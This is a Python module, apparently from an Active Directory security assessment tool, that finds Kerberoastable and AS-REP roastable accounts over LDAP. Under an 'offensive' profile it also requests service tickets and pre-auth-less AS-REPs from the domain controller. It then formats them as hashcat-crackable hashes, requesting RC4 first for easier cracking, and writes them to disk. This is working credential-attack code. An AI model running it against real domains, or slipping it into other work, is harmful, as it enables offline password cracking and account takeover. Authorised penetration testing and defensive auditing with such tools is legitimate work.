"""Kerberoasting and AS-REP roasting checks using impacket library."""

from typing import Dict, List, Optional
from pathlib import Path
from datetime import datetime, timedelta

from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REQ, seq_set, seq_set_iter, AS_REP, KERB_PA_PAC_REQUEST, KRB_ERROR
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue
import socket
import random

from ..utils.logger import get_logger
from .emit import note, sams
from ..utils.ldap import LDAPConnection
from ..utils.output import write_csv, write_lines
from ..core.profiles import OPSEC_LDAP, OPSEC_TICKETS, want_kerberos_tickets


class RoastingChecker:
    """Checks for Kerberoasting and AS-REP roasting vulnerabilities."""
    
    def __init__(self, ldap_conn: LDAPConnection, output_paths: Dict[str, Path], 
                 domain: Optional[str] = None, username: Optional[str] = None,
                 password: Optional[str] = None, dc_ip: Optional[str] = None,
                 hashes: Optional[str] = None, session=None):
        self.ldap = ldap_conn
        self.output_paths = output_paths
        self.logger = get_logger()
        self.session = session
        self.base_dn = ldap_conn.config.base_dn
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip or ldap_conn.config.server
        self.hashes = hashes
        
        # Parse hashes if provided
        self.lm_hash = ''
        self.nt_hash = ''
        if hashes and ':' in hashes:
            self.lm_hash, self.nt_hash = hashes.split(':')
        elif hashes:
            self.nt_hash = hashes
    
    def _skip_kerberos(self) -> bool:
        return not self.session.allow_kerberos()

    def _want_tickets(self) -> bool:
        return want_kerberos_tickets(self.session.profile)

    def _emit_spn(self, sam: str, spn, privileged: bool = False) -> None:
        if not sam:
            return
        if isinstance(spn, (list, tuple)):
            spn_s = ",".join(str(x) for x in spn)
        else:
            spn_s = str(spn or "")
        nxt = []
        if not self._want_tickets():
            nxt = ["--profile offensive --check roasting"]
        self.session.emit(
            id="roast.spn.privileged" if privileged else "roast.spn",
            severity="high" if privileged else "medium",
            title=f"Kerberoastable {'privileged ' if privileged else ''}{sam}",
            asset=sam,
            evidence=spn_s,
            replay=f"# LDAP SPN inventory; TGS: --profile offensive --check roasting",
            backend="ldap",
            check="roasting",
            opsec=OPSEC_LDAP,
            next=nxt,
            names=[sam],
            spn=spn_s,
        )

    def _emit_asrep(self, sam: str) -> None:
        if not sam:
            return
        nxt = []
        if not self._want_tickets():
            nxt = ["--profile offensive --check roasting"]
        self.session.emit(
            id="roast.asrep",
            severity="high",
            title=f"AS-REP roastable {sam}",
            asset=sam,
            evidence="DONT_REQ_PREAUTH",
            replay=f"# LDAP DONT_REQ_PREAUTH; AS-REP: --profile offensive --check roasting",
            backend="ldap",
            check="roasting",
            opsec=OPSEC_LDAP,
            next=nxt,
            names=[sam],
        )

    def check_roasting(self):
        """LDAP listing always; TGS/AS-REP hash request is clock-gated."""
        self._check_kerberoastable_privileged()
        self._check_kerberoastable_users()
        self._check_asrep_roastable()
    
    def _check_kerberoastable_privileged(self):
        """Check for kerberoastable privileged users (adminCount=1)."""
        self.logger.info("---Checking kerberoastable privileged users---")
        
        try:
            users = self.ldap.query(
                search_base=self.base_dn,
                search_filter='(&(objectCategory=person)(objectClass=user)(adminCount=1)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['sAMAccountName', 'servicePrincipalName', 'memberOf']
            )
            
            filepath = self.output_paths['findings'] / 'administrators_serviceprincipalname.txt'
            
            if users:
                count = len(users)
                note(self, f"There are {count} kerberoastable privileged users", id="roast.privileged-count", names=sams(users))
                write_csv(users, filepath, headers=['sAMAccountName', 'servicePrincipalName', 'memberOf'])
                for u in users:
                    self._emit_spn(u.get('sAMAccountName') or '', u.get('servicePrincipalName'), privileged=True)
            else:
                self.logger.success("[+] No kerberoastable privileged users found")
                
        except Exception as e:
            self.logger.error(f"[-] Error checking kerberoastable privileged users: {e}")
    
    def _check_kerberoastable_users(self):
        """Check for all kerberoastable users and request TGS tickets."""
        self.logger.info("---Checking kerberoastable users---")
        
        try:
            users = self.ldap.query(
                search_base=self.base_dn,
                search_filter='(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['sAMAccountName', 'servicePrincipalName']
            )
            
            spn_file = self.output_paths['findings'] / 'users_serviceprincipalname.txt'
            hashes_file = self.output_paths['data'] / 'roasting' / 'users_kerberoast_hashes.txt'
            
            # Create roasting directory if needed
            hashes_file.parent.mkdir(parents=True, exist_ok=True)
            
            if users:
                count = len(users)
                note(self, f"There are {count} kerberoastable users", id="roast.spn-count", names=sams(users))
                write_csv(users, spn_file, headers=['sAMAccountName', 'servicePrincipalName'])
                for u in users:
                    self._emit_spn(u.get('sAMAccountName') or '', u.get('servicePrincipalName'), privileged=False)

                if not self._want_tickets():
                    self.logger.info("[*] audit/recon: SPN inventory only (no TGS request)")
                elif self.domain and self.username and (self.password or self.hashes) and self.dc_ip:
                    if self._skip_kerberos():
                        pass
                    else:
                        self._run_getuserspns(hashes_file)
                else:
                    self.logger.info("[+] Provide password to request TGS tickets automatically")
                    cmd = f"# Run: GetUserSPNs.py -request -dc-ip {self.dc_ip or '<DC>'} {self.domain or '<DOMAIN>'}/{self.username or '<USER>'}"
                    if self.password:
                        cmd += f":{self.password}"
                    elif self.hashes:
                        cmd += f" -hashes {self.hashes}"
                    write_lines([cmd], hashes_file)
            else:
                self.logger.success("[+] No kerberoastable users found")
                
        except Exception as e:
            self.logger.error(f"[-] Error checking kerberoastable users: {e}")
    
    def _run_getuserspns(self, output_file: Path):
        """Request TGS tickets for kerberoastable users using impacket library."""
        try:
            self.logger.info("[+] Requesting TGS tickets for kerberoasting...")
            
            # Get TGT first
            user_name = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            
            try:
                if self.nt_hash:
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                        user_name, '', self.domain,
                        bytes.fromhex(self.lm_hash) if self.lm_hash else b'',
                        bytes.fromhex(self.nt_hash),
                        None, self.dc_ip
                    )
                else:
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                        user_name, self.password, self.domain,
                        b'', b'', None, self.dc_ip
                    )
            except KerberosError as e:
                self.logger.warning(f"[!] Failed to get TGT: {e}")
                return
            
            # Query for SPN users
            spn_users = self.ldap.query(
                search_base=self.base_dn,
                search_filter='(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(sAMAccountName=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['sAMAccountName', 'servicePrincipalName']
            )
            
            hashes = []
            for user in spn_users:
                sam = user.get('sAMAccountName', '')
                spns = user.get('servicePrincipalName', [])
                if isinstance(spns, str):
                    spns = [spns]
                
                for spn in spns:
                    try:
                        server_name = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
                        tgs, cipher, oldSessionKey2, sessionKey2 = getKerberosTGS(
                            server_name, self.domain, None, tgt, cipher, sessionKey
                        )
                        
                        # Format hash for hashcat
                        hash_str = self._format_tgs_hash(tgs, cipher, sam, spn)
                        if hash_str:
                            hashes.append(hash_str)
                        break  # One hash per user is enough
                    except KerberosError as e:
                        self.logger.debug(f"Failed to get TGS for {spn}: {e}")
                        continue
            
            if hashes:
                write_lines(hashes, output_file)
                self.logger.warning(f"[W] Extracted {len(hashes)} TGS hashes")
                self.session.emit(
                    id="roast.tgs",
                    severity="high",
                    title=f"Extracted {len(hashes)} Kerberoast TGS hashes",
                    evidence=str(output_file),
                    replay="hashcat -m 13100",
                    backend="impacket",
                    check="roasting",
                    opsec=OPSEC_TICKETS,
                )
                print(f"[*] Hashes saved to {output_file}")
            else:
                self.logger.info("[+] No TGS hashes extracted (may need different credentials)")
                
        except Exception as e:
            self.logger.error(f"[-] Error during kerberoasting: {e}")
    
    def _format_tgs_hash(self, tgs, cipher, username: str, spn: str) -> Optional[str]:
        """Format TGS ticket as hashcat-compatible hash (same layout as impacket GetUserSPNs)."""
        try:
            decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
            enc_part = decoded['ticket']['enc-part']
            etype = int(enc_part['etype'])
            cipher_bytes = enc_part['cipher'].asOctets()
            # Ticket realm (uppercase) - the AES salt is REALM + username, so user input casing breaks cracking
            realm = str(decoded['ticket']['realm'])
            spn = spn.replace(':', '~')
            
            if etype in (17, 18):  # AES: checksum is the LAST 12 bytes (hashcat 19600/19700)
                return f"$krb5tgs${etype}${username}${realm}$*{spn}*${cipher_bytes[-12:].hex()}${cipher_bytes[:-12].hex()}"
            elif etype in (23, 3):  # RC4 (hashcat 13100) / DES: checksum is the FIRST 16 bytes
                return f"$krb5tgs${etype}$*{username}${realm}${spn}*${cipher_bytes[:16].hex()}${cipher_bytes[16:].hex()}"
            self.logger.debug(f"Skipping TGS for {username}: unsupported etype {etype}")
            return None
        except Exception as e:
            self.logger.debug(f"Failed to format hash: {e}")
            return None
    
    def _check_asrep_roastable(self):
        """Check for AS-REP roastable users and request AS-REPs."""
        self.logger.info("---Checking AS-REP roastable users (DONT_REQ_PREAUTH)---")
        
        try:
            users = self.ldap.query(
                search_base=self.base_dn,
                search_filter='(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
                attributes=['sAMAccountName', 'userAccountControl']
            )
            
            users_file = self.output_paths['findings'] / 'users_dontrequirepreauth.txt'
            hashes_file = self.output_paths['data'] / 'roasting' / 'users_asrep_roast_hashes.txt'
            
            # Create roasting directory if needed
            hashes_file.parent.mkdir(parents=True, exist_ok=True)
            
            if users:
                count = len(users)
                names = [u.get('sAMAccountName', '') for u in users if u.get('sAMAccountName')]
                note(self, f"There are {len(names)} users with DONT_REQ_PREAUTH", id="roast.asrep-count", names=names)
                write_lines(names, users_file)
                for sam in names:
                    self._emit_asrep(sam)

                if not self._want_tickets():
                    self.logger.info("[*] audit/recon: AS-REP inventory only (no hash request)")
                elif self.dc_ip and self.domain:
                    if self._skip_kerberos():
                        pass
                    else:
                        self._run_getnpusers(hashes_file, users)
                else:
                    write_lines([f"# Run: GetNPUsers.py -request -dc-ip {self.dc_ip or '<DC>'} {self.domain or '<DOMAIN>'}/"], hashes_file)
            else:
                self.logger.success("[+] No AS-REP roastable users found")
                
        except Exception as e:
            self.logger.error(f"[-] Error checking AS-REP roastable users: {e}")
    
    def _run_getnpusers(self, output_file: Path, users: List[Dict]):
        """Request AS-REP hashes for users without pre-auth using impacket library."""
        try:
            self.logger.info("[+] Requesting AS-REP hashes...")
            
            hashes = []
            for user in users:
                username = user.get('sAMAccountName', '')
                if not username:
                    continue
                
                try:
                    hash_str = self._get_asrep_hash(username)
                    if hash_str:
                        hashes.append(hash_str)
                except Exception as e:
                    self.logger.debug(f"Failed to get AS-REP for {username}: {e}")
                    continue
            
            if hashes:
                write_lines(hashes, output_file)
                self.logger.warning(f"[!] Extracted {len(hashes)} AS-REP hashes")
                self.session.emit(
                    id="roast.asrep.hash",
                    severity="high",
                    title=f"Extracted {len(hashes)} AS-REP hashes",
                    evidence=str(output_file),
                    replay="hashcat -m 18200",
                    backend="impacket",
                    check="roasting",
                    opsec=OPSEC_TICKETS,
                )
            else:
                self.logger.info("[+] No AS-REP hashes extracted")
                
        except Exception as e:
            self.logger.error(f"[-] Error during AS-REP roasting: {e}")
    
    def _get_asrep_hash(self, username: str) -> Optional[str]:
        """Get AS-REP hash for a user without pre-authentication."""
        from binascii import hexlify
        try:
            # Build AS-REQ without pre-authentication (based on NetExec implementation)
            client_name = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            
            as_req = AS_REQ()
            
            domain = self.domain.upper()
            server_name = Principal(f"krbtgt/{domain}", type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            
            # Build PA-PAC-REQUEST
            pac_request = KERB_PA_PAC_REQUEST()
            pac_request["include-pac"] = True
            encoded_pac_request = encoder.encode(pac_request)
            
            as_req["pvno"] = 5
            as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
            
            as_req["padata"] = noValue
            as_req["padata"][0] = noValue
            as_req["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
            as_req["padata"][0]["padata-value"] = encoded_pac_request
            
            req_body = seq_set(as_req, "req-body")
            
            opts = []
            opts.extend((constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value, constants.KDCOptions.proxiable.value))
            req_body["kdc-options"] = constants.encodeFlags(opts)
            
            seq_set(req_body, "sname", server_name.components_to_asn1)
            seq_set(req_body, "cname", client_name.components_to_asn1)
            
            req_body["realm"] = domain
            
            now = datetime.utcnow() + timedelta(days=1)
            req_body["till"] = KerberosTime.to_asn1(now)
            req_body["rtime"] = KerberosTime.to_asn1(now)
            req_body["nonce"] = random.getrandbits(31)
            
            # Request RC4 first for easier cracking
            supported_ciphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
            seq_set_iter(req_body, "etype", supported_ciphers)
            
            message = encoder.encode(as_req)
            
            try:
                r = sendReceive(message, domain, self.dc_ip)
            except KerberosError as e:
                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                    # RC4 not available, try AES
                    supported_ciphers = (
                        int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                        int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                    )
                    seq_set_iter(req_body, "etype", supported_ciphers)
                    message = encoder.encode(as_req)
                    r = sendReceive(message, domain, self.dc_ip)
                else:
                    raise
            
            # Try to decode as KRB_ERROR first
            try:
                as_rep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
                # If we get here, user requires preauth
                self.logger.debug(f"User {username} requires pre-authentication")
                return None
            except Exception:
                # Not an error, should be AS-REP
                as_rep = decoder.decode(r, asn1Spec=AS_REP())[0]
            
            # Format hash for hashcat
            etype = int(as_rep["enc-part"]["etype"])
            cipher_bytes = as_rep["enc-part"]["cipher"].asOctets()
            
            # Same layout as impacket GetNPUsers (hashcat format)
            if etype in (17, 18):  # AES (hashcat 32100/32200): checksum is the LAST 12 bytes
                return f"$krb5asrep${etype}${username}${domain}${hexlify(cipher_bytes[-12:]).decode()}${hexlify(cipher_bytes[:-12]).decode()}"
            # RC4 (hashcat 18200): checksum is the FIRST 16 bytes
            return f"$krb5asrep${etype}${username}@{domain}:{hexlify(cipher_bytes[:16]).decode()}${hexlify(cipher_bytes[16:]).decode()}"
                
        except KerberosError as e:
            if 'KDC_ERR_PREAUTH_REQUIRED' in str(e) or e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
                return None
            self.logger.debug(f"AS-REP request failed for {username}: {e}")
            return None
        except Exception as e:
            self.logger.debug(f"AS-REP request failed for {username}: {e}")
            return None
